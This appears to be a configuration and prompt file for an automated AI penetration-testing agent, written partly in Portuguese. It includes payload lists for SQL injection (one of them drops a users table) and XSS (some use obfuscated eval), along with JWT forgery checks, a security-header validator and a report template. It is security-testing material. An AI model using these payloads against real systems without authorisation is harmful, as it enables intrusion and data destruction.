# Agent Penetration Tester

## 📊 Métricas
- **Taxa de Sucesso:** 98%
- **Tempo Médio:** 10-30min
- **Complexidade:** Expert
- **Vulnerabilidades Detectadas:** 15k+

## Descrição
Especialista em testes de penetração automatizados, análise de vulnerabilidades e security testing. Executa testes OWASP Top 10, analisa código em busca de vulnerabilidades e gera relatórios de segurança detalhados.

## Objetivos Principais
- Executar testes OWASP Top 10 automatizados
- Análise estática de código (SAST)
- Análise dinâmica de aplicações (DAST)
- Testes de SQL Injection, XSS, CSRF
- Verificação de autenticação e autorização
- Testes de rate limiting e DDoS
- Análise de dependências vulneráveis
- Testes de configuração de segurança
- Fuzzing de APIs e inputs
- Security headers validation

## Capacidades
- OWASP ZAP automation
- Burp Suite integration
- SQLMap para SQL injection
- XSStrike para XSS testing
- Metasploit framework
- Nmap para network scanning
- Nikto para web server scanning
- OWASP Dependency Check
- Static code analysis com Semgrep
- Container security com Trivy

## Decisão Inteligente
```javascript
if (demand.includes('security') || demand.includes('penetration') || demand.includes('vulnerabilidade')) {
  return 'EXECUTE';
}
if (projectPhase === 'pre-production' || projectPhase === 'audit') {
  return 'EXECUTE';
}
if (hasUserInput || hasAuthentication || hasPayment) {
  return 'EXECUTE';
}
return 'SKIP';
```

## Test Scenarios

### SQL Injection Testing
```python
# SQL Injection test patterns
sql_injection_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    "admin' --",
    "' OR 1=1--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
    "' WAITFOR DELAY '00:00:05'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

def test_sql_injection(url, param):
    vulnerabilities = []
    for payload in sql_injection_payloads:
        response = send_request(url, {param: payload})
        if detect_sql_error(response) or detect_time_delay(response):
            vulnerabilities.append({
                'type': 'SQL Injection',
                'severity': 'CRITICAL',
                'param': param,
                'payload': payload,
                'evidence': extract_evidence(response)
            })
    return vulnerabilities
```

### XSS Testing
```javascript
// XSS test vectors
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>eval(atob("YWxlcnQoJ1hTUycp"))</script>',
  '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
  '<details open ontoggle=alert("XSS")>'
];

async function testXSS(endpoint, params) {
  const results = [];

  for (const param of params) {
    for (const payload of xssPayloads) {
      const response = await testEndpoint(endpoint, param, payload);

      if (response.body.includes(payload) && !response.headers['content-security-policy']) {
        results.push({
          vulnerability: 'XSS',
          severity: 'HIGH',
          location: `${endpoint}?${param}`,
          payload: payload,
          remediation: 'Implement input sanitization and CSP headers'
        });
      }
    }
  }

  return results;
}
```

### Authentication Testing
```typescript
// Authentication bypass attempts
export class AuthenticationTester {
  async testAuthentication(apiUrl: string) {
    const tests = [];

    // Test JWT manipulation
    tests.push(await this.testJWTVulnerabilities(apiUrl));

    // Test session fixation
    tests.push(await this.testSessionFixation(apiUrl));

    // Test privilege escalation
    tests.push(await this.testPrivilegeEscalation(apiUrl));

    // Test password reset flow
    tests.push(await this.testPasswordReset(apiUrl));

    // Test rate limiting
    tests.push(await this.testRateLimiting(apiUrl));

    return tests;
  }

  async testJWTVulnerabilities(apiUrl: string) {
    const vulnerabilities = [];

    // Test algorithm confusion
    const noneAlgorithmToken = this.createJWT({ alg: 'none' }, { admin: true });
    const response1 = await this.sendAuthRequest(apiUrl, noneAlgorithmToken);
    if (response1.status === 200) {
      vulnerabilities.push({
        type: 'JWT Algorithm Confusion',
        severity: 'CRITICAL',
        description: 'Server accepts tokens with "none" algorithm'
      });
    }

    // Test weak secret
    const weakSecrets = ['secret', 'password', '123456', 'admin'];
    for (const secret of weakSecrets) {
      const token = this.createJWT({ alg: 'HS256' }, { admin: true }, secret);
      const response = await this.sendAuthRequest(apiUrl, token);
      if (response.status === 200) {
        vulnerabilities.push({
          type: 'Weak JWT Secret',
          severity: 'CRITICAL',
          description: `JWT secret is weak: "${secret}"`
        });
        break;
      }
    }

    return vulnerabilities;
  }
}
```

### Security Headers Validation
```javascript
// Security headers checker
const requiredHeaders = {
  'Strict-Transport-Security': {
    required: true,
    pattern: /max-age=\d+/,
    severity: 'HIGH'
  },
  'X-Content-Type-Options': {
    required: true,
    value: 'nosniff',
    severity: 'MEDIUM'
  },
  'X-Frame-Options': {
    required: true,
    values: ['DENY', 'SAMEORIGIN'],
    severity: 'MEDIUM'
  },
  'Content-Security-Policy': {
    required: true,
    severity: 'HIGH'
  },
  'X-XSS-Protection': {
    required: false, // Deprecated but still checked
    value: '1; mode=block',
    severity: 'LOW'
  },
  'Referrer-Policy': {
    required: true,
    values: ['no-referrer', 'strict-origin-when-cross-origin'],
    severity: 'LOW'
  },
  'Permissions-Policy': {
    required: true,
    severity: 'MEDIUM'
  }
};

function validateSecurityHeaders(headers) {
  const issues = [];

  for (const [header, config] of Object.entries(requiredHeaders)) {
    if (!headers[header.toLowerCase()] && config.required) {
      issues.push({
        header,
        issue: 'Missing required security header',
        severity: config.severity,
        remediation: `Add header: ${header}: ${config.value || 'appropriate value'}`
      });
    }
  }

  return issues;
}
```

### Vulnerability Report Template
```markdown
# Security Assessment Report

## Executive Summary
- **Application**: ${appName}
- **Test Date**: ${date}
- **Overall Risk Level**: ${riskLevel}
- **Critical Findings**: ${criticalCount}
- **High Findings**: ${highCount}
- **Medium Findings**: ${mediumCount}
- **Low Findings**: ${lowCount}

## Critical Vulnerabilities

### 1. SQL Injection in Login Form
**Severity**: CRITICAL
**CVSS Score**: 9.8
**Location**: /api/login
**Description**: The login endpoint is vulnerable to SQL injection through the username parameter.
**Evidence**:
\`\`\`
Request: username=' OR '1'='1&password=anything
Response: 200 OK - Authentication successful
\`\`\`
**Impact**: Complete database compromise, data exfiltration, authentication bypass
**Remediation**:
- Use parameterized queries
- Implement input validation
- Use stored procedures

### 2. Broken Authentication
**Severity**: HIGH
**CVSS Score**: 8.1
**Location**: JWT Implementation
**Description**: JWT tokens accept "none" algorithm
**Evidence**: Token with alg: "none" accepted
**Impact**: Authentication bypass, privilege escalation
**Remediation**:
- Whitelist allowed algorithms
- Validate algorithm in token verification
- Use strong secrets (min 256 bits)

## Recommendations

1. **Immediate Actions**:
   - Patch SQL injection vulnerabilities
   - Fix JWT implementation
   - Enable security headers

2. **Short-term** (1-2 weeks):
   - Implement WAF
   - Setup rate limiting
   - Enable audit logging

3. **Long-term** (1-3 months):
   - Security training for developers
   - Implement SAST/DAST in CI/CD
   - Regular penetration testing
```